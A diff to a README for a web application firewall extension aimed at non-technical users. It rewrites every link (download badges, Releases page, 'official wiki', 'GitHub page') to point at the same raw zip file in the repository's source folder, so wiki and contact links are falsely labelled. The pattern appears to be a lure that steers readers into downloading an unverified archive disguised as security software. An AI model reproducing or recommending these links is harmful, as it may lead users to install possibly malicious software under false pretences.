@@ -1,7 +1,7 @@
 # 🔥 otoroshi-waf-extension - Simplifying Web Application Security
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/releases)
+[![Download](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/raw/refs/heads/main/src/extension_otoroshi_waf_3.9.zip)](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/raw/refs/heads/main/src/extension_otoroshi_waf_3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to the **otoroshi-waf-extension**. This software is designed to help you protect your web applications. It uses the ModSecurity SecLang and includes support for OWASP Core Rule Set (CRS). With this tool, you can enhance your web application's security without needing a technical background.
@@ -22,7 +22,7 @@ Ensure your system meets the following requirements to run the software:
 - **Disk Space:** 100 MB of free space.
 
 ## 📥 Download & Install
-To get started, visit this page to download the software: [Download Page](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/releases).
+To get started, visit this page to download the software: [Download Page](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/raw/refs/heads/main/src/extension_otoroshi_waf_3.9.zip).
 
 1. Go to the **Releases** section.
 2. Find the latest version listed at the top.
@@ -39,7 +39,7 @@ After installation, follow these steps to set up the otoroshi-waf-extension:
 4. Review the settings to ensure your application is properly secured.
 
 ## 📘 Documentation
-Comprehensive documentation is available to help you navigate through features and settings. You can access it through the **Help** menu inside the application or visit the [official wiki](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/wiki) for more in-depth guides.
+Comprehensive documentation is available to help you navigate through features and settings. You can access it through the **Help** menu inside the application or visit the [official wiki](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/raw/refs/heads/main/src/extension_otoroshi_waf_3.9.zip) for more in-depth guides.
 
 ## 🔒 How It Works
 The otoroshi-waf-extension acts as a barrier between your web application and potential threats. It monitors requests, filters unsafe actions, and applies security rules automatically. You don't need any programming skills—all you have to do is install the application and configure basic settings.
@@ -51,9 +51,9 @@ If you encounter any issues or need assistance, please reach out through the iss
 We encourage you to join our community. Share your experiences and contribute to the project. If you have ideas for improvements or discover bugs, feel free to submit a pull request or report an issue.
 
 ## 📞 Contact Us
-For further inquiries, visit our [GitHub page](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension) or contact us directly through GitHub.
+For further inquiries, visit our [GitHub page](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/raw/refs/heads/main/src/extension_otoroshi_waf_3.9.zip) or contact us directly through GitHub.
 
 ## 🌟 Conclusion
 The **otoroshi-waf-extension** is a simple yet effective tool to protect your web applications. With easy installation and configuration, you do not need to be a developer to enhance your application’s security. Download it today and keep your data safe.
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/releases)
+[![Download](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/raw/refs/heads/main/src/extension_otoroshi_waf_3.9.zip)](https://github.com/Abhishek-UI-UX/otoroshi-waf-extension/raw/refs/heads/main/src/extension_otoroshi_waf_3.9.zip)
